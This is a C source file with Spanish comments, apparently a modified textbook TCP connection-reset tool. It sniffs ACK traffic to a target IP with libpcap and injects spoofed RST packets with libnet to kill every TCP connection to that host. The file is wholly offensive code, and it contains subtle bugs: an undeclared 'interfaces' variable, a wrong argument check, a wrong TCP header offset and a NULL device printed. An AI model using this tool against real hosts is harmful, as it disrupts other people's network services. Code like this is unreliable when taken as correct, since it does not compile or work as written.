//Usamos las dos librerías, pcap y libnet, la primera para capturar paquetes, la segunda para crearlos
#include <libnet.h>
#include <pcap.h>
#include "hacking.h"

void caught_packet(u_char *, const struct pcap_pkthdr *, const u_char *);
int set_packet_filter(pcap_t *, struct in_addr *);

struct data_pass
{
    int libnet_handle;
    u_char *packet;
};

int main(int argc, char *argv[])
{
    struct pcap_pkthdr cap_header;
    const u_char *packet, *pkt_data;
    pcap_t *pcap_handle;
    char errbuf[PCAP_ERRBUF_SIZE]; // Same size as LIBNET_ERRBUF_SIZE
    char *device;
    u_long target_ip;
    int network;
    struct data_pass critical_libnet_data;

    if (argc < 1)
    {
        printf("Usage: %s <target IP>\n", argv[0]);
        exit(0);
    }
    
    //Obtenemos la IP
    target_ip = libnet_name_resolve(argv[1], LIBNET_RESOLVE);
    if (target_ip == -1)
        fatal("Invalid target address");
    
    /* Abrimos la captura en el primero de los dispositivos disponibles */

    //Retieves all the interfaces available
    if (pcap_findalldevs(&interfaces, errbuf) == -1)
        pcap_fatal("pcap_lookupdev", errbuf);
    
    //Print the available devices
    printf("\nAvailable Devices are :\n");
    for (device = interfaces; device != NULL; device = device->next)
    {
        printf("%s - %s\n", device->name, device->description);
    }
    printf("Sniffing on device %s\n", interfaces[0].name);

    /* pcap_open_live() function opens a packet-capturing device, returning a handle to it. The arguments for this function are the device to sniff, 
    the maximum packet size, a promiscuous flag, a timeout value, and a pointer to the error buffer*/
    pcap_handle = pcap_open_live(interfaces[0].name, 128, 1, 0, errbuf);
    if (pcap_handle == NULL)
        fatal(errbuf);

    //Vamos a preparar una estructura de datos que pasaremos al callback que procesa cada paquete capturado
    critical_libnet_data.libnet_handle = libnet_open_raw_sock(IPPROTO_RAW);
    if (critical_libnet_data.libnet_handle == -1)
        libnet_error(LIBNET_ERR_FATAL, "can't open network interface. -- this program must run as root.\n");
    
    libnet_init_packet(LIBNET_IP_H + LIBNET_TCP_H, &(critical_libnet_data.packet));
    if (critical_libnet_data.packet == NULL)
        libnet_error(LIBNET_ERR_FATAL, "can't initialize packet memory.\n");
    //El argumento del callback esta listo


    libnet_seed_prand();

    //Fijamos el filtro de los paquetes que queremos capturar
    set_packet_filter(pcap_handle, (struct in_addr *)&target_ip);
    printf("Resetting all TCP connections to %s on %s\n", argv[1], device);

    /*Captura paquetes de forma indefinida. Cada paquete capturado es procesado con el callback
    caught_packet, al que le pasamos un argumento, la estructura critical_libnet_data*/
    pcap_loop(pcap_handle, -1, caught_packet, (u_char *)&critical_libnet_data);

    //Terminamos la captura de paquetes
    pcap_close(pcap_handle);
}

/* Sets a packet filter to look for established TCP connections to target_ip */
int set_packet_filter(pcap_t *pcap_hdl, struct in_addr *target_ip)
{
    //Programa compilado con un filtro BPF
    struct bpf_program filter;
    char filter_string[100];

    /*Filtramos todos los paquetes destinados a nuestro host y que tenga el flag ACK activado - es decir, que pertenezcan a una conexión TCP*/
    sprintf(filter_string, "tcp[tcpflags] & tcp-ack != 0 and dst host %s", inet_ntoa(*target_ip));
    printf("DEBUG: filter string is \'%s\'\n", filter_string);
    
    //Crea el filtro BPF
    if (pcap_compile(pcap_hdl, &filter, filter_string, 0, 0) == -1)
        fatal("pcap_compile failed");
    
    //Asociamos el filtro BPF a nuestra conexión
    if (pcap_setfilter(pcap_hdl, &filter) == -1)
        fatal("pcap_setfilter failed");
}

//Captura un paquete
void caught_packet(u_char *user_args, const struct pcap_pkthdr *cap_header, const u_char *packet)
{
    u_char *pkt_data;
    struct libnet_ip_hdr *IPhdr;
    struct libnet_tcp_hdr *TCPhdr;
    struct data_pass *passed;
    int bcount;

    //Argumento
    passed = (struct data_pass *)user_args; // Pass data using a pointer to a struct.

    //Despues de la cabecera Ethernet tenemos el paquete IP
    IPhdr = (struct libnet_ip_hdr *)(packet + LIBNET_ETH_H);
    //Despues de la cabecera IP tenemos el paquete TCP
    TCPhdr = (struct libnet_tcp_hdr *)(packet + LIBNET_ETH_H + LIBNET_TCP_H);
    //Mostramos la IP y el puerto destino y origen
    printf("resetting TCP connection from %s:%d ",inet_ntoa(IPhdr->ip_src), htons(TCPhdr->th_sport));
    printf("<---> %s:%d\n",inet_ntoa(IPhdr->ip_dst), htons(TCPhdr->th_dport));
    
    //Construimos el paquete IP
    libnet_build_ip(LIBNET_TCP_H,                   // Size of the packet sans IP header
                    IPTOS_LOWDELAY,                 // IP tos
                    libnet_get_prand(LIBNET_PRu16), // IP ID (randomized)
                    0,                              // Frag stuff
                    libnet_get_prand(LIBNET_PR8),   // TTL (randomized)
                    IPPROTO_TCP,                    // Transport protocol
                    *((u_long *)&(IPhdr->ip_dst)),  // Source IP (pretend we are dst)
                    *((u_long *)&(IPhdr->ip_src)),  // Destination IP (send back to src)
                    NULL,                           // Payload (none)
                    0,                              // Payload length
                    passed->packet);                // Packet header memory

    //Construimos el paquete TCP
    libnet_build_tcp(htons(TCPhdr->th_dport),       // Source TCP port (pretend we are dst)
                     htons(TCPhdr->th_sport),       // Destination TCP port (send back to src)
                     htonl(TCPhdr->th_ack),         // Sequence number (use previous ack)
                     libnet_get_prand(LIBNET_PRu32),  // Acknowledgement number (randomized)
                     TH_RST,                          // Control flags (RST flag set only)
                     libnet_get_prand(LIBNET_PRu16),  // Window size (randomized)
                     0,                               // Urgent pointer
                     NULL,                            // Payload (none)
                     0,                               // Payload length
                     (passed->packet) + LIBNET_IP_H); // Packet header memory
    if (libnet_do_checksum(passed->packet, IPPROTO_TCP, LIBNET_TCP_H) == -1)
        libnet_error(LIBNET_ERR_FATAL, "can't compute checksum\n");
    bcount = libnet_write_ip(passed->libnet_handle, passed->packet, LIBNET_IP_H + LIBNET_TCP_H);
    if (bcount < LIBNET_IP_H + LIBNET_TCP_H)
        libnet_error(LIBNET_ERR_WARNING, "Warning: Incomplete packet written.");
    usleep(5000); // pause slightly
}